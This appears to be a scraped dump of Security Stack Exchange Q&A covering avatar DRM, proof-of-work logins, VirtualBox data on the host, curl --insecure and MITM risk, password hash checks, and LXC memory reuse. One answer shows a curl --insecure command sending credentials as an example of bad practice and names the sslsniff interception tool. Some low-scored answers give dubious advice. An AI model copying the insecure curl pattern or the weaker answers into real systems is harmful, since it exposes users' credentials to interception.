<p>In principle, the only reasonable method of copyright is to only send a digital asset to individuals who can be trusted to respect the copyright.  What this may look like is the avatar only being sent to people on one's friends list, everyone else sees a default skin.  Or to stop playing with people who steal digital assets.</p>
","1"
"269805","269805","Is there a way to store data securely on a client so that it can only be read by the client while connected to an authorising source?","<p>I have a difficult issue facing an online gaming social space I frequent where personal content I've made for the platform is being stolen by users.</p>
<p>I'm wondering if there are any solutions to make this much harder to steal work from other users.</p>
<p>To explain: Alice, Bob and Emile join a public session. All users do not know each other, they trust the content server but may not yet trust each other. The content server sends each user copies of each other's personal user avatars and data so they can be represented in the session.</p>
<p>This data is loaded in memory in the clear so it can be rendered, but memory is notionally protected by various scrambling techniques to make it a harder attack vector.</p>
<p>The data is also cached locally on each user's machine so that if they meet again, data does not need to be sent again from the server to save bandwidth and loading times.</p>
<p>However, after meeting, Emile accesses his cache and is able to extract the data, stealing the avatars within it that belong to Alice and Bob, allowing Emile to visually impersonate, misrepresent Alice and Bob or just make unauthorised use of the content.</p>
<p>Is there a way for the cached data to be encrypted such that it can only be decrypted in memory while Alice or Bob are connected via the network in an active session?</p>
","1","3","269810","<p>This might be too much overhead for the problem at hand, but you could digitally sign the content with a key that is associated with the account. This won't prevent someone reading the content and copying it or using it, and this only works when within the system that allows for the verification of the signature, but it would work within the game environment.</p>
<ul>
<li>Each user's avatar and other user-created content is signed with a private key stored in the user's account</li>
<li>The system itself, and other users, could use a signature verification process to determine the signed owner of the content</li>
<li>Other people could use the user-generated content, but would not be able to pass it off as their own</li>
</ul>
<p>This is a form of DRM (digital rights management), and this has its weaknesses, and really only works within the confines of the system.</p>
","0"
"269805","269805","Is there a way to store data securely on a client so that it can only be read by the client while connected to an authorising source?","<p>I have a difficult issue facing an online gaming social space I frequent where personal content I've made for the platform is being stolen by users.</p>
<p>I'm wondering if there are any solutions to make this much harder to steal work from other users.</p>
<p>To explain: Alice, Bob and Emile join a public session. All users do not know each other, they trust the content server but may not yet trust each other. The content server sends each user copies of each other's personal user avatars and data so they can be represented in the session.</p>
<p>This data is loaded in memory in the clear so it can be rendered, but memory is notionally protected by various scrambling techniques to make it a harder attack vector.</p>
<p>The data is also cached locally on each user's machine so that if they meet again, data does not need to be sent again from the server to save bandwidth and loading times.</p>
<p>However, after meeting, Emile accesses his cache and is able to extract the data, stealing the avatars within it that belong to Alice and Bob, allowing Emile to visually impersonate, misrepresent Alice and Bob or just make unauthorised use of the content.</p>
<p>Is there a way for the cached data to be encrypted such that it can only be decrypted in memory while Alice or Bob are connected via the network in an active session?</p>
","1","3","269857","<p>A solution to make it much harder: encrypt the content (files) delivered by the server and provide the decryption key(s) when needed to display the content.</p>
<p>Basically this is what Spotify did when they launched the Spotify Web Player about ten years ago: They would serve encrypted audio files and pass the respective decryption algorithm as Javascript code via Websocket to the client (as far as I could see).</p>
<p>Obviously there will be ways to circumvent this mechanism, but it will increase the cost of the attacker.</p>
","0"
"269802","269802","Using Proof of Work to slow down login attempts","<p>For a while I've been pondering a user authentication protocol that aims to ensure that a client does some computational work before the server will attempt to authenticate the password.</p>
<p>The reason for this is to remove some of the asymmetry involved when a bad actor hits a login endpoint. The server has to perform an expensive password hash operation, while the client just sends a request. This means that the server will be using a lot more resources than the clients.</p>
<p>To dissuade bad actors, I had the following idea, inspired by bitcoin, for a login protocol:</p>
<ol>
<li>Client sends request to server, stating that they would like to do a login attempt.</li>
<li>Server responds that the client may proceed. It also includes some random string and asks the client to produce a string such that the random string appended with the string generated by the client will have X number of 0s at the end of its SHA1 hash.</li>
<li>Client generates random strings and SHAs them until a string matching the condition is found. and sends that string with the login request, along with the user's credential</li>
<li>Server validates the string does in fact generate such a SHA when appended to the initially returned random string. Then performs a (much more expensive than SHA) hash check on the user's password.</li>
</ol>
<p>Is there a good reason that such a pattern is not being used today, or would such a process achieve the goal?</p>
","5","3","269838","<p>I would hash the passwords client side using Argon2 and a salt sent from the user table in the server. Use an Argon2 memory parameter as high as your lowest common denominator device. If you are using common consumer devices including mobiles this could be 64MB. This calculation will act as the proof-of-work.</p>
<p>This method will have the added benefit (as opposed to a non hashing proof-of-work) of increasing security on your passwords against dictionary and brute force attacks in the case your database in compromised, due to Argon2’s memory intensive algorithm. It will somewhat prevent DOS attacks but really there is nothing you can do to stop your client sending random messages to your authentication server that don’t contain any proof-of-work.</p>
<p>Note that the password needs to be hashed server side also with SHA256 for instance in order to avoid pass-the-hash attacks.</p>
","-1"
"269802","269802","Using Proof of Work to slow down login attempts","<p>For a while I've been pondering a user authentication protocol that aims to ensure that a client does some computational work before the server will attempt to authenticate the password.</p>
<p>The reason for this is to remove some of the asymmetry involved when a bad actor hits a login endpoint. The server has to perform an expensive password hash operation, while the client just sends a request. This means that the server will be using a lot more resources than the clients.</p>
<p>To dissuade bad actors, I had the following idea, inspired by bitcoin, for a login protocol:</p>
<ol>
<li>Client sends request to server, stating that they would like to do a login attempt.</li>
<li>Server responds that the client may proceed. It also includes some random string and asks the client to produce a string such that the random string appended with the string generated by the client will have X number of 0s at the end of its SHA1 hash.</li>
<li>Client generates random strings and SHAs them until a string matching the condition is found. and sends that string with the login request, along with the user's credential</li>
<li>Server validates the string does in fact generate such a SHA when appended to the initially returned random string. Then performs a (much more expensive than SHA) hash check on the user's password.</li>
</ol>
<p>Is there a good reason that such a pattern is not being used today, or would such a process achieve the goal?</p>
","5","3","269839","<p>This sounds like a solution to a non-issue. Nothing forces the server to calculate a password hash whenever a client sends a request. Rate limits can trivially be implemented by making the clients wait for a while. Granted, there's a risk of an attacker locking out legitimate users by constantly hitting the rate limit. An alternative solution which doesn't have this problem is to make the user solve a CAPTCHA when they want to log in. In any case, the server has full control over how much work it spends on password hashing.</p>
<p>The approach you describe also has the problem that the computational power available to a client can vary a lot. A legitimate client may only have an ancient mobile device which struggles to solve even the simplest challenges, while an attacker could use a powerful GPU, a web service like AWS or even specialized hardware. It's going to be very difficult to find a balance which makes the challenge both acceptable for legitimate users and hard enough for attackers.</p>
","2"
"269802","269802","Using Proof of Work to slow down login attempts","<p>For a while I've been pondering a user authentication protocol that aims to ensure that a client does some computational work before the server will attempt to authenticate the password.</p>
<p>The reason for this is to remove some of the asymmetry involved when a bad actor hits a login endpoint. The server has to perform an expensive password hash operation, while the client just sends a request. This means that the server will be using a lot more resources than the clients.</p>
<p>To dissuade bad actors, I had the following idea, inspired by bitcoin, for a login protocol:</p>
<ol>
<li>Client sends request to server, stating that they would like to do a login attempt.</li>
<li>Server responds that the client may proceed. It also includes some random string and asks the client to produce a string such that the random string appended with the string generated by the client will have X number of 0s at the end of its SHA1 hash.</li>
<li>Client generates random strings and SHAs them until a string matching the condition is found. and sends that string with the login request, along with the user's credential</li>
<li>Server validates the string does in fact generate such a SHA when appended to the initially returned random string. Then performs a (much more expensive than SHA) hash check on the user's password.</li>
</ol>
<p>Is there a good reason that such a pattern is not being used today, or would such a process achieve the goal?</p>
","5","3","270546","<p>I just implemented something similar on my site (justinthomas.pro) to require proof of work to submit a form request:</p>
<p><a href=""https://gitlab.com/justindthomas/justinthomas.pro/-/blob/master/src/routes/components/Compose.svelte"" rel=""nofollow noreferrer"">https://gitlab.com/justindthomas/justinthomas.pro/-/blob/master/src/routes/components/Compose.svelte</a></p>
<p>I was seeing a spate of what looked like programmatic garbage submissions, so I'm experimenting (I really dislike CAPTCHAs). I'm using Argon2 in WASM on the client and server to hash the user-agent and a time-limited (10s) nonce generated by the server using a Blake3 hash of the time and a secret value. The Argon2 hash is sent with the POST request and verified by the server before inserting the record.</p>
<p>You can see the Rust WASM components in that repository in the master/wasm directory. I'm still experimenting and tweaking (i.e., I haven't ratcheted up the Argon2 parameters yet) but I think it's a workable (if over-engineered) approach.</p>
","0"
"269584","269584","How can data from VirtualBox leak to the host and how to avoid it?","<p>I used a virtual machine (Windows host/Linux mint guest) to store some very sensitive and private data (it shouldn't be uncovered by state-level actors). Today I decided to check how much deleted files can be recovered from my host system using a popular disk drill software. After just few minutes of scanning I found out some recovered pictures from the guest machine! There were thumbnails (usually 256x124) of screenshots and telegram messenger pictures. All these compromising pictures had names starting with &quot;GNOMEThumbnailFactory&quot;. There were also default wallpapers of my machine, that compromise plausible deniability I am trying to achieve.</p>
<p>How is this possible? Maybe these files leaked to swap file when Virtualbox used it, or Virtualbox loaded these files into some sort of cache? Also I used shared folder and guest additions (yes, I know that this is bad for security...), but I am sure that I didn't put all these images in shared folder and never sent them to host in any way. And is there any way to stop these leaks?</p>
<p>P.S. I also want to add that I had erased all free space on all disks with windows <a href=""https://eraser.heidi.ie/"" rel=""noreferrer"">Eraser</a> tool before I launched disk drill.</p>
<p>UPDATE:
Thank everyone! I understood that I just forgot to remove the unencrypted copy of my virtual machine disk image. After removing it and leaving only the copy on the VeraCrypt encrypted partition my files recovering tool stopped to see VM's files.</p>
","13","4","269586","<p>You are doing it the wrong way around: you have an untrusted host system running a hypervisor and you are trying to run a trusted environment inside this untrusted host. But, the untrusted host system has more privileges than the untrusted VM - which means that access from the host to the VM is possible and also manipulation of the VM can be done from the host.</p>
<p>This includes access to the disk image of the VM, which is residing on the host system. Also the RAM of the VM is accessible from the hypervisor on the host system and might be inspected. In your specific case it probably just scanned the disk image.</p>
<p>There is not much you can do about this. While you could encrypt the disk image (i.e. full disk encryption in the VM), the key for decryption is in the RAM of the VM and thus can be extracted from the host.</p>
<p>The host/hypervisor is meant to protect itself from the VMs. And the VMs are meant to be protected from one another by the host. They are not meant to be protected against the host itself (there are some trends like confidential computing, which try to rely on less trust in the host). If you want to have a trusted and an untrusted system on the same hardware you could install a minimal trusted hypervisor which then runs both of these systems as a VM. Or you could run the trusted system on the host and the untrusted system inside the host as VM. But you should not run the trusted system inside the untrusted one like you currently attempt.</p>
","51"
"269584","269584","How can data from VirtualBox leak to the host and how to avoid it?","<p>I used a virtual machine (Windows host/Linux mint guest) to store some very sensitive and private data (it shouldn't be uncovered by state-level actors). Today I decided to check how much deleted files can be recovered from my host system using a popular disk drill software. After just few minutes of scanning I found out some recovered pictures from the guest machine! There were thumbnails (usually 256x124) of screenshots and telegram messenger pictures. All these compromising pictures had names starting with &quot;GNOMEThumbnailFactory&quot;. There were also default wallpapers of my machine, that compromise plausible deniability I am trying to achieve.</p>
<p>How is this possible? Maybe these files leaked to swap file when Virtualbox used it, or Virtualbox loaded these files into some sort of cache? Also I used shared folder and guest additions (yes, I know that this is bad for security...), but I am sure that I didn't put all these images in shared folder and never sent them to host in any way. And is there any way to stop these leaks?</p>
<p>P.S. I also want to add that I had erased all free space on all disks with windows <a href=""https://eraser.heidi.ie/"" rel=""noreferrer"">Eraser</a> tool before I launched disk drill.</p>
<p>UPDATE:
Thank everyone! I understood that I just forgot to remove the unencrypted copy of my virtual machine disk image. After removing it and leaving only the copy on the VeraCrypt encrypted partition my files recovering tool stopped to see VM's files.</p>
","13","4","269594","<p>The data didn't &quot;leak&quot; onto the host. The data always was on the host to begin with. The files inside the guest are stored in the virtual hard drive file, and the virtual hard drive file is stored on the host's hard drive. Therefore, the files inside the guest are stored on the host's hard drive.</p>
<p>By analogy, if you have some cookies in a jar, and the jar is inside your kitchen, then the cookies are inside your kitchen. If somebody searches your kitchen, then they're going to find the cookies. You wouldn't ask &quot;How did the cookies leak from the jar into my kitchen?&quot; because the cookies always were in your kitchen to begin with.</p>
<p>There's no way to prevent this. The guest is <em>part</em> of the host; all of the data stored on the guest is stored on the host, and all of the computation performed by the guest is actually performed by the host. You could use whole-disk encryption on the guest, but that wouldn't help very much, because you would still need to type the password into the host in order to use the guest.</p>
","29"
"269584","269584","How can data from VirtualBox leak to the host and how to avoid it?","<p>I used a virtual machine (Windows host/Linux mint guest) to store some very sensitive and private data (it shouldn't be uncovered by state-level actors). Today I decided to check how much deleted files can be recovered from my host system using a popular disk drill software. After just few minutes of scanning I found out some recovered pictures from the guest machine! There were thumbnails (usually 256x124) of screenshots and telegram messenger pictures. All these compromising pictures had names starting with &quot;GNOMEThumbnailFactory&quot;. There were also default wallpapers of my machine, that compromise plausible deniability I am trying to achieve.</p>
<p>How is this possible? Maybe these files leaked to swap file when Virtualbox used it, or Virtualbox loaded these files into some sort of cache? Also I used shared folder and guest additions (yes, I know that this is bad for security...), but I am sure that I didn't put all these images in shared folder and never sent them to host in any way. And is there any way to stop these leaks?</p>
<p>P.S. I also want to add that I had erased all free space on all disks with windows <a href=""https://eraser.heidi.ie/"" rel=""noreferrer"">Eraser</a> tool before I launched disk drill.</p>
<p>UPDATE:
Thank everyone! I understood that I just forgot to remove the unencrypted copy of my virtual machine disk image. After removing it and leaving only the copy on the VeraCrypt encrypted partition my files recovering tool stopped to see VM's files.</p>
","13","4","269600","<p>You don't give much details about the tool you used to discover the sensitive files, but many commercially available data recovery utilities can do much the same. The virtual machine disks are just files on the host system's hard drive, and the content in them can show up in such a tool when a &quot;full disk scan&quot; is run against the host drive. Being designed to help in case a disk was accidentally formatted and then reused, these tools typically read every sector of the physical disk and parse any file system structures they recognize, even if there appears to be multiple nested file systems, which would be the case with a non-securely re-formatted drive – or a virtual disk image occupying part of the host volume. Because of this file system reconstruction, the tool may be able to pull off files complete with their names from virtual disk images or &quot;contained filesystems&quot;, as it has likely happened in your example. This explanation is consistent with your mention that you sanitized the unused disk space before performing the scan.</p>
<p>Using full disk encryption in the guest VM, this type of leak is prevented, as the virtual disk image will then consist of random-looking data from which no meaningful information can be extracted. However, while the VM is running, the encryption key will be present in the host's RAM, where it can be accessed by a determined opponent (such as a state-level actor you mentioned) if the computer is forcibly seized from you while powered on, or if the opponent manages to infect it with suitable data collecting malware. It should also be noted that if the guest VM's memory is allowed to be swapped, some of its contents may end up unencrypted in the host OS's swap file / partition, where it may remain to be discovered in a forensic examination even if both the VM and the host have been shut down. For this reason, full disk encryption should also be used on the host.</p>
<p>If you're under threat to have your equipment confiscated or tampered with, and possibly be personally coerced to give up your login details, a fully separated &quot;hidden&quot; operating system that you only use for the activities that might get you in trouble might be a better solution than the use of a virtual machine whose data could be observed from the outside (host) by means discussed above. <a href=""https://www.veracrypt.fr/en/Hidden%20Operating%20System.html"" rel=""nofollow noreferrer"">VeraCrypt</a> is one product that offers such feature; there may be others. Put in a concise way, the idea is that you can have different startup passwords for booting a &quot;decoy&quot; or a &quot;hidden&quot; OS, and if you're forced to reveal the password, you'll just give them the one for the &quot;decoy&quot; system, inside which the existence of a hidden one cannot be proven due to encryption. Read the documentation carefully if you decide to go this route.</p>
","1"
"269584","269584","How can data from VirtualBox leak to the host and how to avoid it?","<p>I used a virtual machine (Windows host/Linux mint guest) to store some very sensitive and private data (it shouldn't be uncovered by state-level actors). Today I decided to check how much deleted files can be recovered from my host system using a popular disk drill software. After just few minutes of scanning I found out some recovered pictures from the guest machine! There were thumbnails (usually 256x124) of screenshots and telegram messenger pictures. All these compromising pictures had names starting with &quot;GNOMEThumbnailFactory&quot;. There were also default wallpapers of my machine, that compromise plausible deniability I am trying to achieve.</p>
<p>How is this possible? Maybe these files leaked to swap file when Virtualbox used it, or Virtualbox loaded these files into some sort of cache? Also I used shared folder and guest additions (yes, I know that this is bad for security...), but I am sure that I didn't put all these images in shared folder and never sent them to host in any way. And is there any way to stop these leaks?</p>
<p>P.S. I also want to add that I had erased all free space on all disks with windows <a href=""https://eraser.heidi.ie/"" rel=""noreferrer"">Eraser</a> tool before I launched disk drill.</p>
<p>UPDATE:
Thank everyone! I understood that I just forgot to remove the unencrypted copy of my virtual machine disk image. After removing it and leaving only the copy on the VeraCrypt encrypted partition my files recovering tool stopped to see VM's files.</p>
","13","4","269623","<p>Contrary to other answers here, the use of a Virtualbox guest in Windows <strong>is</strong> absolutely a valid way of making it more difficult for software outside the VM, and even for the Windows system itself, to get and tamper with information inside it.  It is not a way to protect state-level secrets - for that you need to use a trusted OS.  But if you have to use Windows anyway, then a VM is a way to make certain things safer. As an example, I don't want to give Windows access to my password manager, so when I am in Windows, my password manager resides in my Mint guest OS.</p>
<p>How much a VM can protect you depends on the level of attention you have attracted, and whether or not you've taken some basic precautions.</p>
<p><strong>Precautions:</strong></p>
<ol>
<li>The most basic precaution is that the guest operating system <strong>MUST</strong> itself be encrypted.  This is completely beside the fact of whether or not you use whole-disk-encryption or if your Windows OS is itself encrypted.  Host or whole-disk encryption protects the entire system's data in case the  computer is lost or stolen.  Encryption of the guest OS protects the guest's data from other software and (to an extent) from the OS itself.  Otherwise the guest is sitting inside an image container which is itself just a large file in Windows.  That file makes up sectors on your hard drive, like any other file.  This is how your recovery tools found the images.  The tool was doing a sector-by-sector scan of the host OS looking for sectors that have data with jpeg (or other image format) signatures.  This scan didn't care if those sectors were inside a guest OS container file.  Most good Linux distros offer encrypted installation using LUKS.  If you have swap, make sure that is encrypted too.</li>
<li>The next most important precaution is swap.  As you identified, swapping can be a way for information to leak out.  Remember that the guest swap is independent of the host.  If the host becomes low on memory, then the guest's VM RAM usage is a big juicy chunk of RAM to swap out.  You want to keep the memory assigned to the guest small enough that the host won't want need to swap it out.  When the guest is active, avoid memory hungry activities outside on the host.</li>
<li>If you use a VPN inside the guest OS, then network information flowing into and out of the VM will be end-to-end encrypted and more difficult to intercept.</li>
</ol>
<p>If these precautions are followed, then a VM can offer <em>some</em> protection.  It can protect against:</p>
<ul>
<li><em>Some</em> forms of automated memory scanning, even when the scanning process has access to all memory since many of those tools are looking for Windows process markers.</li>
<li>Process monitors - most process monitors hook into Windows API calls and won't notice Linux processes being created and terminated</li>
<li>Most forms of TCP/IP interception (when a VPN in the guest is used) hook into the Windows stack, and not into CPU data flow.  This means that VPN data is safer from monitoring from outside the VM.</li>
</ul>
<p>It must be noted that a VM makes it more difficult, but not impossible to intercept what is happening.  You are still working with a Windows OS.  Every key press, mouse movement, and pixel being displayed on your screen goes through the OS.  A VM will not protect you from key-loggers.  It won't protect against an opponent who knows or expects a VM to be used and makes tools specifically to look for that.</p>
<p>That all being said, it does offer a measure of protection from casual monitoring.  It certainly doesn't make it less safe.</p>
","0"
"269538","269538","Does disabling TLS server certificate verification (E.g. curl --insecure option) expose client to MITM","<p>If you as a client trust the server and know the IP of the server, and intend to initiate a HTTPS request to that IP, what are the potential vulnerabilities in disabling server certificate verification, such as <a href=""https://curl.se/docs/sslcerts.html#:%7E:text=Tell%20libcurl%20to,%2D%2Dinsecure."" rel=""noreferrer"">disabling this with curl</a> via <code>-k/--insecure</code>?</p>
<p>Specifically, can an attacker replace the certificate in a man-in-the-middle-attack during the key exchange?</p>
","5","3","269540","<p>Yes.  If your client does not verify the certificate that it sees for the server, then this opens the door for a man in the middle (MITM) attack.</p>
<p>See <a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/Man-in-the-middle_attack</a> for some interesting reading on how MITM attacks work.  As you can see, the basis for the attack is that the MITM attacker replaces the server's actual certificate with his own fake certificate.  The attack is deadly - but the attack can only succeed if the MITM is able to dupe the client into trusting the MITM's fake certificate instead of the server's actual certificate.</p>
<p>If the client blindly trusts the certificate that it sees for the server without verifying it (which is what <code>curl</code> does when the <code>--insecure</code> option is used; or what <code>wget</code> does when the <code>--no-check-certificate</code> option is used) - then anyone in a position to intercept the traffic between the client and the server (such as your ISP, or the operator of the Wifi hotspot that you are using, etc.), could act as a MITM, and use a tool such as <a href=""https://github.com/moxie0/sslsniff"" rel=""nofollow noreferrer"">sslsniff</a> with a fake certificate to MITM the SSL/TLS connection between the client and the server.  This is why it is so important for the client to validate that the certificate that it sees for the server is actually the true and correct certificate for the server.</p>
<p>Typically, the client performs this validation by verifying that the certificate that it sees for the server is <a href=""https://security.stackexchange.com/questions/56389/ssl-certificate-framework-101-how-does-the-browser-actually-verify-the-validity?rq=1"">signed by a certificate authority (CA) that the client trusts</a>.  Command line tools such as <code>curl</code> and <code>wget</code> have the ability to do this.</p>
<p>If using a command line tool such as <code>curl</code> and <code>wget</code> to make an https request, and the tool fails due to a certificate validation error - the most likely cause is that the tool simply does not know where to find the root CA certificate that the site's certificate chains up to.  Rather than addressing the symptom (by simply disabling certificate checking), it's much better to address the source of the problem, to avoid opening the door to a MITM attack.</p>
","17"
"269538","269538","Does disabling TLS server certificate verification (E.g. curl --insecure option) expose client to MITM","<p>If you as a client trust the server and know the IP of the server, and intend to initiate a HTTPS request to that IP, what are the potential vulnerabilities in disabling server certificate verification, such as <a href=""https://curl.se/docs/sslcerts.html#:%7E:text=Tell%20libcurl%20to,%2D%2Dinsecure."" rel=""noreferrer"">disabling this with curl</a> via <code>-k/--insecure</code>?</p>
<p>Specifically, can an attacker replace the certificate in a man-in-the-middle-attack during the key exchange?</p>
","5","3","269541","<p>The attacker does not need to replace certificate on the target server. Also the attacker will not wait until the client received the certificate from the server, because afterwards there will be no way to read the traffic.</p>
<p>The attacker will intercept any request from the client to the server. If request means initiating TLS connection, the attacker's device will behave as a server. In particular, when the client requests a certificate, the attacker will generate a certificate and send it back. Even though the certificate is self-signed or issued by some non-trusted CA of the attacker, your client will trust it and establish a TLS session.</p>
<p>Also the attacker will establish a TLS session to the server. The attacker will read request from your client, modify if needed, and send to the server. Then receive a server response, modify it if needed, and send to your client.</p>
","11"
"269538","269538","Does disabling TLS server certificate verification (E.g. curl --insecure option) expose client to MITM","<p>If you as a client trust the server and know the IP of the server, and intend to initiate a HTTPS request to that IP, what are the potential vulnerabilities in disabling server certificate verification, such as <a href=""https://curl.se/docs/sslcerts.html#:%7E:text=Tell%20libcurl%20to,%2D%2Dinsecure."" rel=""noreferrer"">disabling this with curl</a> via <code>-k/--insecure</code>?</p>
<p>Specifically, can an attacker replace the certificate in a man-in-the-middle-attack during the key exchange?</p>
","5","3","269542","<p>Yes.</p>
<p>if you did e.g.</p>
<pre><code>curl --insecure 'https://151.101.1.69/users/login' -d ssrc=login -d email=Webster -d password=hunter1 --header 'Host: meta.stackexchange.com'
</code></pre>
<p>to log into stackexchange (simplified example), then the client (i.e. the <code>curl</code> command where you used <code>--insecure</code>) would happily connect (and send that request with username and password) to an attacker that MITM your connection to 151.101.1.69</p>
<p>Evidently, if you are not sending any sensitive data, <em>and</em> you are treating the response as untrusted data anyway, <em>and</em> you don't care about wrong/invalid info, <em>and</em> it's not an issue that the command hangs forever or gets sent infinite data, then it <em>might</em> not be an issue in your specific use case (still a bad practice, though).</p>
<p>The proper way would be:</p>
<ol>
<li>Use the server hostname for which the certificate is sent:</li>
</ol>
<pre><code>curl 'https://meta.stackexchange.com/users/login' -d ssrc=login -d email=Webster -d password=hunter1
</code></pre>
<p>If you wanted to force connecting to specific IP address 203.0.113.69 instead of whatever is resolved by the dns, you could use curl option <code>--connect-to</code></p>
<pre><code>curl --connect-to meta.stackexchange.com:443:203.0.113.69:8080  'https://meta.stackexchange.com/users/login' -d ssrc=login -d email=Webster -d password=hunter1
</code></pre>
<p>or simply add it to <code>/etc/hosts</code></p>
<ol start=""2"">
<li>If the problem is that the certificate is not trusted (e.g. it's using an unknown intermediate, an internal CA, or even a self-signed certificate), you can provide an explicitly with <code>--cacert</code> which CA/certificate to trust.</li>
</ol>
","4"
"269511","269511","How do websites check that password hashes saved in the database are the same as passwords hashed client-side?","<p>How do websites check that password hashes saved in the database are the same as passwords hashed and sent by a client?</p>
<p>I know that client-side hashing is not secure.</p>
","2","3","269513","<p>User enters name and password. Browser sends them to the server. Server looks up for an entry by user name. From the found entry server takes the salt and other parameters (depending on hashing methods, these can be number of iterations, memory factor) and calculates a hash of password using the same parameters. Then compares the result with the hash in the database.</p>
<blockquote>
<p>send hash to the server, which is not secure</p>
</blockquote>
<p>A secure connections should be used, means HTTPS/TLS. If connection is not secure, then of course sending any authentication data is not secure.</p>
","0"
"269511","269511","How do websites check that password hashes saved in the database are the same as passwords hashed client-side?","<p>How do websites check that password hashes saved in the database are the same as passwords hashed and sent by a client?</p>
<p>I know that client-side hashing is not secure.</p>
","2","3","269514","<p>Suppose when the user registers with the site, he creates an account with username: <code>user</code> and password: <code>p4$$w0rd</code>.  The server generates a random salt, then passes the password and the salt to a password hashing function (such as PBKDF2, Argon2, etc).  Let's call the output of the password hashing function <code>H</code>.  The salt and H are stored in the database record for <code>user</code>.</p>
<p>Later, the user comes back to the site, and attempts to login using the username: <code>user</code> and password: <code>p4$$w0rd</code>.  The server queries the database record for <code>user</code>, to get the salt and H for that user.  The server passes the password (<code>p4$$w0rd</code>) and the salt to the password hashing function, and compares the result of this with H.  If they match, then the user is authenticated.</p>
<p>Related:  <a href=""https://stackoverflow.com/questions/18035093/given-a-linux-username-and-a-password-how-can-i-test-if-it-is-a-valid-account/18035305#18035305"">https://stackoverflow.com/questions/18035093/given-a-linux-username-and-a-password-how-can-i-test-if-it-is-a-valid-account/18035305#18035305</a></p>
","-1"
"269511","269511","How do websites check that password hashes saved in the database are the same as passwords hashed client-side?","<p>How do websites check that password hashes saved in the database are the same as passwords hashed and sent by a client?</p>
<p>I know that client-side hashing is not secure.</p>
","2","3","269520","<p>If the passwords are hashed client-side and the hash is sent to the server and the server isn't supposed to do anything with the hash, then the comparison process would be the same as if the password is sent and not hashed client-side. The hash string is simply looked up in the server's authentication database. This is generally seen as a bad implementation and is not recommended. Old websites or custom-built sites and applications that did not follow modern best-practice may still do this.</p>
<p>Some modern implementations hash client-side, but the server also salts and hashes the submitted hash and treats the client-side hash like a password. In this case, the process is the same for a plain password. The hash <em>becomes</em> the password, and the hash string is treated like any password string in a modern &quot;salt-hash-store/compare&quot; logic flow.</p>
<p>Note that salting on the client-side is very difficult, and usually not done. So, that's not something that needs to be managed or accounted for on the server side, unless you are talking about a custom implementation.</p>
","0"
"269507","269507","Is RAM wiped before use in another LXC container?","<p><strong>Edit</strong>: though my wording may not be exact, I understand that two containers don't have access to the same memory at the same time. My question is <strong>can one container see data that another has deallocated</strong>?</p>
<p>LXC allows us to over-provision RAM.</p>
<p>I assume this means that if one container needs a bunch of RAM and another container isn't using its allotment, then the unallocated RAM goes to the container that needs it.</p>
<p>Let's say that one container had some private keys loaded, <strong>and that memory was deallocated</strong>, and another container just allocates its maximum heap and starts walking it.</p>
<p>Is there the possibility of reading that private key?</p>
<p><strong>Or is it wiped or otherwise allocated in a way that prevents data leakage?</strong></p>
<p><strong>Where is the documentation that clarifies this?</strong> <br />
(my serach-fu is weak on this - probably because I don't know the right terms)</p>
","50","3","269510","<p>This isn't how memory allocation in linux works, so your scenario is not right.</p>
<p>The linux kernel maintains a pool of free pages and quickly freeable pages (which includes cached disk blocks and process pages already written to swap but still in ram).  Of these pages, it also keeps a pool of pre-zeroed pages (the size of this pool is adjustable).  When a process needs a new memory page, it is pulled from this pool.</p>
<p>When a process asks for a new page, it will get a zeroed page, and won't get a page with data from another process.  Generally, a process can't access another process's memory, but there are many exceptions (see a partial list below).</p>
<p>While new pages will arrive from the kernel zeroed, some memory management libraries may reuse memory rather than releasing freed pages to the OS, and these might not be zeroed (depending on the library and API call used), containing old data from the heap and stack from its previous use within the process.  This sometimes can be a security risk and source of bugs from reading uninitialized variables, but zeroing them is also considered a performance issue, especially if the code using the memory will immediately initialize it anyway.</p>
<p>Overprovisioning doesn't mean ram is given to both programs.  It means it is given to neither of them until the last second.</p>
<p>So, let's say program A and B both have 1G of memory allocated to them.
The system has 8G.  Now both A and B (simultaneously or sequentially) ask for 5G.   With overprovisioning, we can grant that request, but not actually give either one the memory -- just the address space.</p>
<p>The system still has 6G of memory in the free pool.  A and B have &quot;requested&quot; a total of 6G each, but are each only using 1G and only have that 1G assigned to them.  But they each have page table entries (with no assigned pages) for another 5G.</p>
<p>So the first time one of them writes to one of the newly requested pages, it gets a soft page fault, which causes a (pre-zeroed) page to be pulled from the free pool and assigned to that page table entry, and then the soft faulted write is allowed to continue with a real memory page assigned to it.</p>
<p>If the two programs allocate and use memory slowly, and perhaps never use everything they requested, this all works fine.  If you have some swap, possibly some unused or infrequently  pages in the program get written to virtual memory (swap) and returned to the free pool.</p>
<p>However, if both of them end up with a combined working set of used pages greater than the system physical memory, then either one or both of them will get killed with an OOM error (out of memory) (if you don't have enough swap to cover it), or the system will start thrashing as it tries to constantly swap pages between physical ram and virtual memory.</p>
<p>The alternative to overprovisioning is to immediately deny the memory request if there isn't enough virtual memory to cover it.  Many programs are not written to handle this denial and will crash due to bugs, or just crash because they can't continue without the memory.  So frequently, at worst, overprovisioning delays the program's death (or makes the system thrash), and at best, it avoids some possible nasty bugs and allows programs that request memory they might not actually use to continue running as if they got it anyway.</p>
<p>Adding containers to this does not change it at all.  When you provision the container, you don't assign memory to the container (loading the container and running it does that live, as needed), it assigns memory <em>limits</em> to the container.  When enough actual pages are assigned to the things in the container to exhaust those assigned limits, then the things in the container will get an OOM kill just like above.</p>
<p>If you've overprovisioned the containers and they try to reach those limits all at once, you'll get either thrashing or the OOM kill when the system's memory is exhausted, before the container's memory limit is reached.</p>
<p>It is also possible to tweak the container memory allocations so that one container can thrash while other containers perform normally.</p>
<p>Here is a partial list of cases where a process can see another process's memory:</p>
<ul>
<li>Immediately after a fork, the parent and child share all memory pages. The linux kernel marks these as copy on write (with a reference counter) so these pages are shared read only, and the first write by either process clones the page so it is no longer shared.</li>
<li>A process can clone itself, sort of like fork, but with more control over which parts of the process are shared writable and which parts are COW cloned (as with fork).  If almost nothing is cloned, it acts like a thread or light weight process.</li>
<li>A process can explicitly share a page to another process through multiple mechanisms, and this can have full bidirectional write for both processes.  (The oldest form of this is SysV shared memory which is all but obsoleted by other more flexible methods.)</li>
<li>A process can debug (ptrace) another process and get full access to its memory and execution flow.  However, since this is such a huge security risk, this is generally only allowed for root or for for a parent process to debug its child; The main use is for a debugger (like gdb) to start a process to debug.  However, programs like <code>strace</code> and <code>ltrace</code> can do this without root access.  And this can be relaxed via kernel option so gdb can attach to any running process a user owns.</li>
